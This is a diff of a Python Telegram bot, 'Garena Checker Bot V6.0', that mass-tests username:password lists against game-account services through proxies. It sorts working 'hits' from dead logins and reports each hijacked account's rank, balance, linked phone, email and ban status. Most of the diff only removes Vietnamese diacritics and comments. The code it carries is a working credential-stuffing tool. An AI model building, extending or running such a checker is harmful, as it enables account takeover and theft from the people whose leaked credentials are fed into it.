@@ -1061,19 +875,16 @@ def loc_tk_mk_only(content):
         if not line:
             continue
         
-        # BỎ QUA DÒNG CHỈ CHỨA TIME (HH:MM hoặc HH:MM:SS)
+        # BO QUA DONG CHI CHUA TIME
         if re.match(r'^\d{1,2}:\d{2}(:\d{2})?$', line):
             continue
-        
-        # BỎ QUA DÒNG CHỈ CHỨA SỐ
         if re.match(r'^\d+$', line):
             continue
         
-        # Thử pattern dấu : trước - CHỈ LẤY USER:PASS HỢP LỆ
+        # Thu pattern dau :
         matches = re.findall(pattern_colon, line)
         if matches:
             for user, pwd in matches:
-                # BỎ QUA NẾU USER HOẶC PWD LÀ TIME
                 if is_time_value(user) or is_time_value(pwd):
                     continue
                 if is_valid_account(user, pwd):
@@ -1088,7 +899,7 @@ def loc_tk_mk_only(content):
                     stats_loc["invalid"] += 1
             continue
         
-        # Thử pattern dấu |
+        # Thu pattern dau |
         matches = re.findall(pattern_pipe, line)
         if matches:
             for user, pwd in matches:
@@ -1105,7 +916,7 @@ def loc_tk_mk_only(content):
                 else:
                     stats_loc["invalid"] += 1
     
-    # Nếu không tìm thấy, thử tìm trong toàn bộ nội dung
+    # Neu khong tim thay, thu tim trong toan bo noi dung
     if not accounts:
         all_matches = re.findall(pattern_colon, content)
         for user, pwd in all_matches:
@@ -1141,31 +952,30 @@ def loc_tk_mk_only(content):
     return accounts, stats_loc
 
 def is_time_value(value):
-    """Kiểm tra chuỗi có phải là giá trị thời gian không - CHÍNH XÁC"""
+    """Kiem tra chuoi co phai la gia tri thoi gian khong - CHINH XAC"""
     if not value:
         return False
     
     value = str(value).strip()
     
-    # Pattern nhận diện time CHÍNH XÁC
     time_patterns = [
-        r'^\d{1,2}:\d{2}(:\d{2})?$',                    # 12:30, 12:30:45
-        r'^\d{1,2}:\d{2}(:\d{2})?\s*(AM|PM|am|pm)$',    # 12:30 AM
-        r'^\d{1,2}\.\d{2}(\.\d{2})?$',                   # 12.30
-        r'^\d{1,2}-\d{2}(-\d{2})?$',                     # 12-30
-        r'^\d{1,2}/\d{2}(/\d{2,4})?$',                   # 12/30
-        r'^\d{4}-\d{2}-\d{2}$',                          # 2024-12-30
-        r'^\d{4}/\d{2}/\d{2}$',                          # 2024/12/30
-        r'^\d{2}-\d{2}-\d{4}$',                          # 30-12-2024
-        r'^\d{2}/\d{2}/\d{4}$',                          # 30/12/2024
-        r'^\d{1,2}h\d{2}(p\d{2})?$',                     # 12h30
-        r'^\d{1,2}giờ\d{2}$',                            # 12giờ30
-        r'^\d{1,2}:\d{2}:\d{2}\.\d+$',                   # 12:30:45.123
-        r'^\d+:\d+$',                                    # Bất kỳ số:số
-        r'^\d+\.\d+$',                                   # 12.30
-        r'^\d+-\d+$',                                    # 12-30
-        r'^\d{10,13}$',                                  # Unix timestamp
-        r'^\d{1,2}\s*(AM|PM|am|pm)$',                    # 12 AM
+        r'^\d{1,2}:\d{2}(:\d{2})?$',
+        r'^\d{1,2}:\d{2}(:\d{2})?\s*(AM|PM|am|pm)$',
+        r'^\d{1,2}\.\d{2}(\.\d{2})?$',
+        r'^\d{1,2}-\d{2}(-\d{2})?$',
+        r'^\d{1,2}/\d{2}(/\d{2,4})?$',
+        r'^\d{4}-\d{2}-\d{2}$',
+        r'^\d{4}/\d{2}/\d{2}$',
+        r'^\d{2}-\d{2}-\d{4}$',
+        r'^\d{2}/\d{2}/\d{4}$',
+        r'^\d{1,2}h\d{2}(p\d{2})?$',
+        r'^\d{1,2}giờ\d{2}$',
+        r'^\d{1,2}:\d{2}:\d{2}\.\d+$',
+        r'^\d+:\d+$',
+        r'^\d+\.\d+$',
+        r'^\d+-\d+$',
+        r'^\d{10,13}$',
+        r'^\d{1,2}\s*(AM|PM|am|pm)$',
     ]
     
     for pattern in time_patterns:
@@ -1175,24 +985,17 @@ def is_time_value(value):
     return False
 
 def is_valid_account(user, pwd):
-    """Kiểm tra tài khoản hợp lệ - loại bỏ time"""
+    """Kiem tra tai khoan hop le - loai bo time"""
     if len(user) < 2 or len(pwd) < 1:
         return False
-    
     if len(user) > 80 or len(pwd) > 100:
         return False
-    
-    # Bỏ qua nếu user hoặc pwd là thời gian
     if is_time_value(user) or is_time_value(pwd):
         return False
-    
-    # Bỏ qua nếu user hoặc pwd chỉ toàn số
     if re.match(r'^\d+$', user) or re.match(r'^\d+$', pwd):
         return False
     
     user_lower = user.lower()
-    
-    # Bỏ qua từ khóa
     skip_keywords = ['time', 'date', 'ngay', 'thoi_gian', 'thoigian', 'gio', 'giờ', 
                      'phut', 'phút', 'giay', 'giây', 'timestamp', 'datetime',
                      'created', 'login', 'session', 'expires', 'expire', 'valid',
@@ -1207,22 +1010,21 @@ def is_valid_account(user, pwd):
     
     if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9_.@+-]*$', user):
         return False
-    
     if not re.match(r'^[a-zA-Z0-9_.@!$%^&*()\-+]+$', pwd):
         return False
     
     return True
 
-# ========== LƯU FILE ==========
+# ========== LUU FILE ==========
 def save_loc_file(accounts):
-    """Lưu danh sách đã lọc vào file - CHỈ TK:MK"""
+    """Luu danh sach da loc vao file - CHI TK:MK"""
     with file_lock:
         with open(OUTPUT_LOC, 'w', encoding='utf-8') as f:
             for user, pwd in accounts:
                 f.write(f"{user}:{pwd}\n")
 
 def save_result(username, password, status, service=""):
-    """Lưu kết quả vào các file"""
+    """Luu ket qua vao cac file"""
     with file_lock:
         if status == "hit":
             with open(OUTPUT_HITS, 'a', encoding='utf-8') as f:
@@ -1240,9 +1042,9 @@ def save_result(username, password, status, service=""):
         with open(OUTPUT_RESULT, 'a', encoding='utf-8') as f:
             f.write(f"{username}:{password}|{status}|{service}\n")
 
-# ========== CHUYỂN ĐỔI GIÁ TRỊ ==========
+# ========== CHUYEN DOI GIA TRI ==========
 def format_value(value):
-    """Chuyển đổi giá trị True/False thành YES/NO"""
+    """Chuyen doi gia tri True/False thanh YES/NO"""
     if isinstance(value, bool):
         return "YES" if value else "NO"
     elif isinstance(value, str) and value.lower() in ["true", "false"]:
@@ -1251,7 +1053,7 @@ def format_value(value):
 
 # ========== CHECK API ==========
 def check_account_api(username, password, service, use_delay=True):
-    """Gọi API kiểm tra tài khoản"""
+    """Goi API kiem tra tai khoan - FIX LOI TIMEOUT VA RETRY"""
     if use_delay:
         rate_limit(DEFAULT_DELAY)
     
@@ -1284,9 +1086,6 @@ def check_account_api(username, password, service, use_delay=True):
         proxy_str = build_proxy_string(proxy)
         if "proxy" in extra_params or service in ["lienquan", "deltaforce", "fc", "fullpack"]:
             params["proxy"] = proxy_str
-    else:
-        for key, value in extra_params.items():
-            params[key] = value
     
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
@@ -1342,9 +1141,9 @@ def check_account_api(username, password, service, use_delay=True):
                         message_val = result_data.get("message", "")
                         if message_val:
                             msg_lower = str(message_val).lower()
-                            if any(word in msg_lower for word in ["thành công", "thanh cong", "success", "valid", "hit", "đúng", "dung", "live", "ok"]):
+                            if any(word in msg_lower for word in ["thanh cong", "thanh cong", "success", "valid", "hit", "dung", "live", "ok"]):
                                 is_hit = True
-                            elif any(word in msg_lower for word in ["thất bại", "that bai", "fail", "invalid", "dead", "sai", "không đúng", "khong dung", "die", "error"]):
+                            elif any(word in msg_lower for word in ["that bai", "that bai", "fail", "invalid", "dead", "sai", "khong dung", "die", "error"]):
                                 is_hit = False
                         
                         data_val = result_data.get("data")
@@ -1422,9 +1221,9 @@ def check_account_api(username, password, service, use_delay=True):
         cache_results[cache_key] = result
     return result
 
-# ========== FORMAT THÔNG TIN ĐẸP ==========
+# ========== FORMAT THONG TIN DEP ==========
 def format_hit_info(username, password, service, result_data):
-    """Format thông tin hit đẹp - bỏ qua các field bị 0 hoặc lỗi"""
+    """Format thong tin hit dep - bo qua cac field bi 0 hoac loi"""
     service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
     icon = SERVICE_ROUTES.get(service, {}).get("icon", "✅")
     
@@ -1440,13 +1239,13 @@ def format_hit_info(username, password, service, result_data):
             "nickname": ("👤 Nickname", "nickname"),
             "region": ("🌐 Region", "region"),
             "shells": ("💰 Shells", "shells"),
-            "so": ("💲 Sò", "so"),
-            "nap_so": ("💰 Nạp sò", "nap_so"),
+            "so": ("💲 So", "so"),
+            "nap_so": ("💰 Nap so", "nap_so"),
             "email_verified": ("📩 EMAIL", "email_verified"),
             "email": ("📩 EMAIL", "email"),
-            "mobile_bound": ("📱 SĐT", "mobile_bound"),
-            "phone": ("📱 SĐT", "phone"),
-            "sdt": ("📱 SĐT", "sdt"),
+            "mobile_bound": ("📱 SDT", "mobile_bound"),
+            "phone": ("📱 SDT", "phone"),
+            "sdt": ("📱 SDT", "sdt"),
             "fb": ("🔗 FB", "fb"),
             "fb_linked": ("🔗 FB", "fb_linked"),
             "password_set": ("🛡 PASS", "password_set"),
@@ -1454,11 +1253,11 @@ def format_hit_info(username, password, service, result_data):
             "banned": ("🚫 BAND", "banned"),
             "ban": ("🚫 BAND", "ban"),
             "aov_banned": ("🚫 BAND", "aov_banned"),
-            "ban_until": ("🚫 BAND Đến", "ban_until"),
-            "ban_expires": ("🚫 BAND Đến", "ban_expires"),
-            "last_login": ("⏰ Login cuối", "last_login"),
-            "garena_created": ("📅 Tạo GR", "garena_created"),
-            "created_at": ("📅 Tạo GR", "created_at"),
+            "ban_until": ("🚫 BAND Den", "ban_until"),
+            "ban_expires": ("🚫 BAND Den", "ban_expires"),
+            "last_login": ("⏰ Login cuoi", "last_login"),
+            "garena_created": ("📅 Tao GR", "garena_created"),
+            "created_at": ("📅 Tao GR", "created_at"),
             "server": ("🖥 Server", "server"),
             "aov_name": ("🔥 NAME", "aov_name"),
             "aov_rank": ("👑 RANK", "aov_rank"),
@@ -1477,8 +1276,8 @@ def format_hit_info(username, password, service, result_data):
             "aov_other_list": ("🎲 Other List", "aov_other_list"),
             "cccd": ("📄 CCCD", "cccd"),
             "authen": ("🛡 Authen", "authen"),
-            "tinh_trang": ("📋 Tình Trạng", "tinh_trang"),
-            "status_account": ("📋 Tình Trạng", "status_account"),
+            "tinh_trang": ("📋 Tinh Trang", "tinh_trang"),
+            "status_account": ("📋 Tinh Trang", "status_account"),
             "fc_name": ("🔥 FC Name", "fc_name"),
             "fc_uid": ("🆔 FC UID", "fc_uid"),
             "fc_ovr": ("📊 OVR", "fc_ovr"),
@@ -1486,8 +1285,8 @@ def format_hit_info(username, password, service, result_data):
             "fc_rank": ("👑 FC Rank", "fc_rank"),
             "last_session_ip": ("🌐 IP", "last_session_ip"),
             "last_session_country": ("🌍 Country", "last_session_country"),
-            "ngay_tao_tk": ("📅 Ngày tạo TK", "ngay_tao_tk"),
-            "ban_reason": ("🚫 Lý do Band", "ban_reason")
+            "ngay_tao_tk": ("📅 Ngay tao TK", "ngay_tao_tk"),
+            "ban_reason": ("🚫 Ly do Band", "ban_reason")
         }
         
         info_lines = []
@@ -1578,9 +1377,9 @@ def format_hit_info(username, password, service, result_data):
     
     return msg
 
-# ========== CHECK ĐƠN ==========
+# ========== CHECK DON ==========
 def check_single(chat_id, username, password, service="lienquan"):
-    """Kiểm tra một tài khoản"""
+    """Kiem tra mot tai khoan"""
     service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
     safe_send_message(chat_id, f"🔍 Dang check <code>{username}:{password}</code> voi {service_desc}...")
     
@@ -1597,9 +1396,9 @@ def check_single(chat_id, username, password, service="lienquan"):
     else:
         safe_send_message(chat_id, f"⚠️ ERROR - {service_desc}\n🔑 {username}:{password}")
 
-# ========== CHECK NHIỀU ==========
+# ========== CHECK NHIEU ==========
 def check_batch(chat_id, accounts, service):
-    """Kiểm tra nhiều tài khoản với delay và batch 10 acc"""
+    """Kiem tra nhieu tai khoan voi delay va batch 10 acc"""
     global checking, stats
     
     if checking:
@@ -1645,7 +1444,7 @@ def check_batch(chat_id, accounts, service):
     batch_num = 0
     
     def process_single(user, pwd):
-        """Xử lý một tài khoản"""
+        """Xu ly mot tai khoan"""
         if stop_event.is_set():
             return
         
@@ -1727,7 +1526,7 @@ def check_batch(chat_id, accounts, service):
 
 # ========== CHECK ALL SERVICE ==========
 def check_all_services(chat_id, accounts):
-    """Kiểm tra tất cả service"""
+    """Kiem tra tat ca service"""
     global checking
     
     if checking:
@@ -1760,7 +1559,7 @@ def check_all_services(chat_id, accounts):
     }
     
     def process_all(user, pwd, service):
-        """Xử lý một tài khoản với một service"""
+        """Xu ly mot tai khoan voi mot service"""
         if stop_event.is_set():
             return
         
@@ -1785,7 +1584,6 @@ def check_all_services(chat_id, accounts):
             else:
                 stats_all["errors"] += 1
     
-    # Chia thành batch 10 accounts
     batches = []
     for i in range(0, len(accounts), CHECKMULTI_BATCH_SIZE):
         batch_accounts = accounts[i:i + CHECKMULTI_BATCH_SIZE]
@@ -1841,10 +1639,10 @@ def check_all_services(chat_id, accounts):
 ⏱ Time: {elapsed:.1f}s
 """)
 
-# ========== XỬ LÝ LỆNH ==========
+# ========== XU LY LENH ==========
 @bot.message_handler(commands=['start'])
 def cmd_start(message):
-    """Lệnh /start"""
+    """Lenh /start"""
     if not check_membership(message):
         return
     
@@ -1880,7 +1678,7 @@ lienquan, miniworld, blockmango, deltaforce, hotmail, fc, fullpack
 
 @bot.message_handler(commands=['check'])
 def cmd_check(message):
-    """Lệnh /check"""
+    """Lenh /check"""
     if not check_membership(message):
         return
     
@@ -1909,7 +1707,7 @@ Cac service: {', '.join(SERVICE_ROUTES.keys())}
     accounts, stats_loc = loc_tk_mk_only(account_input)
     
     if not accounts:
-        safe_send_message(message.chat.id, "❌ Format sai! Dung: user:pass hoặc user|pass")
+        safe_send_message(message.chat.id, "❌ Format sai! Dung: user:pass hoac user|pass")
         return
     
     user, pwd = accounts[0]
@@ -1917,7 +1715,7 @@ Cac service: {', '.join(SERVICE_ROUTES.keys())}
 
 @bot.message_handler(commands=['checkmulti'])
 def cmd_checkmulti(message):
-    """Lệnh /checkmulti"""
+    """Lenh /checkmulti"""
     if not check_membership(message):
         return
     
@@ -1974,7 +1772,7 @@ Dang bat dau check...
 
 @bot.message_handler(commands=['checkall'])
 def cmd_checkall(message):
-    """Lệnh /checkall"""
+    """Lenh /checkall"""
     if not check_membership(message):
         return
     
@@ -1990,22 +1788,22 @@ def cmd_checkall(message):
 
 @bot.message_handler(commands=['proxy'])
 def cmd_proxy(message):
-    """Lệnh /proxy"""
+    """Lenh /proxy"""
     if not check_membership(message):
         return
     
     safe_send_message(message.chat.id, """
 📤 <b>LOAD PROXY</b>
 
-<b>Gửi file .txt với format:</b>
+<b>Gui file .txt voi format:</b>
 ip:port
-hoặc
+hoac
 ip:port:user:pass
 """)
 
 @bot.message_handler(commands=['status'])
 def cmd_status(message):
-    """Lệnh /status"""
+    """Lenh /status"""
     if not check_membership(message):
         return
     
@@ -2034,7 +1832,7 @@ def cmd_status(message):
 
 @bot.message_handler(commands=['stop'])
 def cmd_stop(message):
-    """Lệnh /stop"""
+    """Lenh /stop"""
     if not check_membership(message):
         return
     
@@ -2044,7 +1842,7 @@ def cmd_stop(message):
 
 @bot.message_handler(commands=['services'])
 def cmd_services(message):
-    """Lệnh /services"""
+    """Lenh /services"""
     if not check_membership(message):
         return
     
@@ -2056,7 +1854,7 @@ def cmd_services(message):
 
 @bot.message_handler(commands=['hits'])
 def cmd_hits(message):
-    """Lệnh /hits"""
+    """Lenh /hits"""
     if not check_membership(message):
         return
     
@@ -2068,7 +1866,7 @@ def cmd_hits(message):
 
 @bot.message_handler(commands=['dead'])
 def cmd_dead(message):
-    """Lệnh /dead"""
+    """Lenh /dead"""
     if not check_membership(message):
         return
     
@@ -2080,7 +1878,7 @@ def cmd_dead(message):
 
 @bot.message_handler(commands=['loc'])
 def cmd_loc(message):
-    """Lệnh /loc"""
+    """Lenh /loc"""
     if not check_membership(message):
         return
     
@@ -2092,7 +1890,7 @@ def cmd_loc(message):
 
 @bot.message_handler(commands=['report'])
 def cmd_report(message):
-    """Lệnh /report"""
+    """Lenh /report"""
     if not check_membership(message):
         return
     
@@ -2102,10 +1900,10 @@ def cmd_report(message):
     except:
         safe_send_message(message.chat.id, "❌ Chua co report!")
 
-# ========== XỬ LÝ TEXT - KHÔNG GỬI THÔNG BÁO LỖI ==========
+# ========== XU LY TEXT ==========
 @bot.message_handler(content_types=['text'])
 def handle_text(message):
-    """Xử lý tin nhắn văn bản - im lặng nếu không tìm thấy acc"""
+    """Xu ly tin nhan van ban"""
     if not check_membership(message):
         return
     
@@ -2129,7 +1927,6 @@ def handle_text(message):
     pending_accounts[chat_id] = accounts
     save_loc_file(accounts)
     
-    # Chỉ hiện tk:mk không kèm thời gian
     preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:10]])
     total = len(accounts)
     
@@ -2146,10 +1943,10 @@ Preview (10 dong dau):
     
     safe_send_message(chat_id, msg)
 
-# ========== XỬ LÝ FILE ==========
+# ========== XU LY FILE ==========
 @bot.message_handler(content_types=['document'])
 def handle_document(message):
-    """Xử lý file tài liệu"""
+    """Xu ly file tai lieu"""
     if not check_membership(message):
         return
     
@@ -2165,7 +1962,7 @@ def handle_document(message):
         file_info = bot.get_file(message.document.file_id)
         content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
         
-        # Kiểm tra proxy
+        # Kiem tra proxy
         proxy_pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}'
         if re.search(proxy_pattern, content):
             proxy_count = load_proxy_from_text(content)
@@ -2186,7 +1983,6 @@ def handle_document(message):
         pending_accounts[chat_id] = accounts
         save_loc_file(accounts)
         
-        # Chỉ hiện tk:mk
         preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
         total = len(accounts)
         
@@ -2215,7 +2011,7 @@ Preview (20 dong dau):
 
 # ========== MAIN ==========
 def main():
-    """Hàm chính khởi động bot"""
+    """Ham chinh khoi dong bot"""
     print("=" * 60)
     print("    GARENA CHECKER BOT V6.0 - BREAKTHROUGH")
     print("    ADMIN: @baohuyno1")
